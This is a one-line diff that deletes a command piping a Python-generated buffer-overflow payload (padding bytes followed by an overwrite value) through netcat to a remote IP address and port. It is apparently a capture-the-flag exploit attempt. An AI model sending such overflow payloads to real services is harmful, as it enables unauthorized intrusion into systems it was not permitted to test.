@@ -1,1 +1,0 @@
-python3 -c 'import sys; sys.stdout.buffer.write(b"A"*16+b"\x01\x00\x00\x00")' | nc 34.145.29.222 30002
